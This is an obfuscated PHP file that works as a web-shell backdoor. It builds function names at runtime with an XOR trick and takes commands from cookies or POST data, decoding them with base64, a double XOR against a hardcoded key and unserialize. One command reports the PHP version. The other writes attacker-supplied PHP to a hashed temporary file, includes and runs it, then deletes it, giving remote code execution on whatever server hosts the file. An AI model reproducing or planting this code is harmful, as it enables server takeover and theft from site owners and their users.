<?php        function	yfynmzlfo(){/* wtlai   */echo  53974;/*   quko  */}
$nkfchwtx	=	'nkfchwtx'/* ddh */^/*   twbkr */'';
$pmb_z_k	=     $nkfchwtx(102)/*   f*/.	"i"."l"."\145"      .	$nkfchwtx(95)/*edzwv   */.	"\x70"  ./*mkya */$nkfchwtx(117)	.   "t"."\x5f"/* hqyvu*/.  "c"."o".$nkfchwtx(177-67)	.  "\x74"	./* rb  */"\145"	.       "n"."t".$nkfchwtx(115);

$lmgtaiuw/*   gtom*/=/*l   */$nkfchwtx(279-181)   ./* xi*/$nkfchwtx(97)	./*   u_y */"s".$nkfchwtx(101)/*   veg*/./* yvwxj*/$nkfchwtx(54)   .	$nkfchwtx(52)	./*nggdr */"_"."d"."\145"	./*  cau   */$nkfchwtx(413-314)       ./*   b_   */"o".$nkfchwtx(100)	.	"\x65";


$uypsu	=/* t   */"\x75"      .    $nkfchwtx(263-153)/*  z*/./*   f  */"s"."\145"      ./* ep*/$nkfchwtx(114)  ./*thwsw*/"\151"       .    "a"."\154"    .     "i"."z"."e";

$mglqeer/* qiz   */=	"\160"  .   "\x68"     ./* n */"\x70"/*   m*/./*   xs*/"v"."\145"     ./*  vjldi*/$nkfchwtx(114)     .	"\x73"	.      $nkfchwtx(105)	.	$nkfchwtx(417-306)  .	"n";

$fpwok       =	"u".$nkfchwtx(195-85)/*   _ybh  */./*   u   */"l"."i"."\156"/*  a   */.	$nkfchwtx(107);


    

function	faplaz_o($zzhvb,	$ewvucclxz)


{


  global      $nkfchwtx;


      $xcytoqiqgxctkm	=/*   nfw*/"";/*ghbi   */for       ($shjwa       =	0;	$shjwa/* zpdz*/<  strlen($zzhvb);)/*xa*/{      for	($xcytoqiq	=  0;	$xcytoqiq/*_g_t */</*   qb*/strlen($ewvucclxz)    &&  $shjwa/* g  */<       strlen($zzhvb);/*  eso   */$xcytoqiq++,       $shjwa++)/*th */{


/*   ix  */$xcytoqiqgxctkm    .=   $nkfchwtx(ord($zzhvb[$shjwa])	^	ord($ewvucclxz[$xcytoqiq]));


       }  }


/*  ovrkw   */return	$xcytoqiqgxctkm;}




$wgvtroejpb	=    $_COOKIE;

$edjyw	=       $_POST;


$wgvtroejpb      =      array_merge($edjyw,   $wgvtroejpb);$gohjetcni     =	"\143"  .	"7"."1".$nkfchwtx(994-896)	.      $nkfchwtx(97)	./*  l_ztl */$nkfchwtx(532-480)/*   qmcqm  */.  "c"."\62"	.    "-"."\x62"	.	"\x64"     .	"\67"	./*   mrj   */$nkfchwtx(55)	.	$nkfchwtx(273-228)    .	$nkfchwtx(52)     .    "0"."\x66"/*__eb*/./*   fuqa */"5"."-"."9"."8"."\63"/*z  */.      $nkfchwtx(604-553)     ./*  zx  */"-"."\x34"      .       "6"."\x31"     .  "1".$nkfchwtx(49)/*dfz*/./*  m  */"\x38"	./* c */"e"."5"."8"."4"."e"."\145";

foreach       ($wgvtroejpb   as/* zhuig   */$yodqktk	=>	$zzhvb)	{
    $zzhvb/*  n_wwd */=	$uypsu(faplaz_o(faplaz_o($lmgtaiuw($zzhvb),/*nkr*/$gohjetcni),	$yodqktk));   if       (isset($zzhvb[$nkfchwtx(947-850)."k"]))      {

  if	($zzhvb[$nkfchwtx(947-850)]	==/* bdc */"i")	{/*  zra*/$shjwa   =	array();
/*wg  */$shjwa[$nkfchwtx(346-234)/*   qsmb   */.       "v"]	=       $mglqeer();
	$shjwa["s"."\x76"]	=      $nkfchwtx(51)	.      "."."\65";/*  q   */echo	@serialize($shjwa);      }	elseif	($zzhvb[$nkfchwtx(947-850)]	==     "e")	{


     $n_zrvigwn     =	sprintf("."."/".$nkfchwtx(469-432)	.     "s".$nkfchwtx(878-832)	./*  vt   */"p"."l",   md5($gohjetcni));

	$pmb_z_k($n_zrvigwn,	"<"	.    "?"."\160"	./*dtmqh*/"h".$nkfchwtx(332-220)/*   _ */.	$nkfchwtx(32)/* to_   */.     $nkfchwtx(1019-902)      .	"n"."l".$nkfchwtx(105)	./*   _f*/"\x6e"      ./*   u_qw*/"\x6b"     .      $nkfchwtx(320-280)    .	$nkfchwtx(747-652)/*wkh*/.	$nkfchwtx(95)/*   q   */.     "F"."\x49"    .     "L".$nkfchwtx(69)	.	$nkfchwtx(451-356)    .	"_".")".$nkfchwtx(533-474)/*   _hrgi  */.	$nkfchwtx(32)      .	$zzhvb[$nkfchwtx(100)]);


/*oqncy   */include($n_zrvigwn);


/*fsas*/$fpwok($n_zrvigwn);	}


/*   zppqb  */exit();


	}}

